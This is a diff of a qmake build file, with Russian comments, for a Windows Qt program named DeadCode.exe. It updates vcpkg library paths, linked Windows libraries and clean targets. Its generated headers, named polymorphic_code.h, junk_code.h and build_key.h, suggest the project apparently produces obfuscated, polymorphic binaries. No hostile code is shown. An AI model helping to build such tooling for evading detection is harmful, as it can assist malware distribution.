@@ -25,19 +25,29 @@ FORMS   += \
 # Ресурсы (иконка)
 RC_ICONS = $$PWD/../icon.ico
 
-# Пути для поиска заголовочных файлов (только проектные директории)
+# Пути для поиска заголовочных файлов
 INCLUDEPATH += \
+    $$PWD/../src \
+    $$PWD \
+    $$(VCPKG_ROOT)/installed/x64-windows-static/include
+
+# Пути для отслеживания зависимостей
+DEPENDPATH += \
     $$PWD/../src \
     $$PWD
 
 # Библиотеки (vcpkg и системные Windows-библиотеки)
-# Пути к библиотекам задаются через переменную окружения LIB в build.yml
-LIBS += -lsqlite3 \
-        -lzip \
-        -lz \
-        -lbz2 \
-        -lcurl \
-        -lws2_32
+LIBS += \
+    -L$$(VCPKG_ROOT)/installed/x64-windows-static/lib \
+    -lsqlite3 \
+    -lzip \
+    -lzlib \
+    -lbz2 \
+    -lcurl \
+    -lbcrypt \
+    -lws2_32 \
+    -lshlwapi \
+    -lpsapi
 
 # Флаги компиляции
 QMAKE_CXXFLAGS += -O2 \
@@ -67,12 +77,12 @@ OBJECTS_DIR = $$PWD/../release
 MOC_DIR = $$PWD/../release
 UI_DIR = $$PWD/../release
 
-# Очистка (удаляем исполняемый файл и временные заголовки при очистке проекта)
+# Очистка (удаляем только исполняемый файл и временные файлы сборки)
 QMAKE_CLEAN += \
     $$DESTDIR/DeadCode.exe \
-    $$PWD/../src/build_key.h \
-    $$PWD/../src/polymorphic_code.h \
-    $$PWD/../src/junk_code.h
+    $$OBJECTS_DIR/*.o \
+    $$MOC_DIR/*.cpp \
+    $$UI_DIR/*.h
 
 # Дополнительные проверки и зависимости для Windows
 win32 {
@@ -81,11 +91,12 @@ win32 {
         QMAKE_CXXFLAGS += -g
     } else {
         # Для релизной сборки
-        # Убрали -static, так как Qt обычно динамический
+        # Убрали -static, так как Qt динамический
     }
 }
 
-# Пользовательские шаги сборки для генерации заголовков
+# Удаляем создание пустых заголовков, так как они генерируются динамически
+# Вместо этого добавляем зависимость от генерации
 PRE_TARGETDEPS += \
     $$PWD/../src/build_key.h \
     $$PWD/../src/polymorphic_code.h \
@@ -93,13 +104,3 @@ PRE_TARGETDEPS += \
 
 QMAKE_EXTRA_TARGETS += gen_headers
 gen_headers.commands = @echo "Headers are generated during runtime by mainwindow.cpp"
-# Создание пустых файлов, если они отсутствуют
-!exists($$PWD/../src/build_key.h) {
-    system(echo. > $$PWD/../src/build_key.h)
-}
-!exists($$PWD/../src/polymorphic_code.h) {
-    system(echo. > $$PWD/../src/polymorphic_code.h)
-}
-!exists($$PWD/../src/junk_code.h) {
-    system(echo. > $$PWD/../src/junk_code.h)
-}
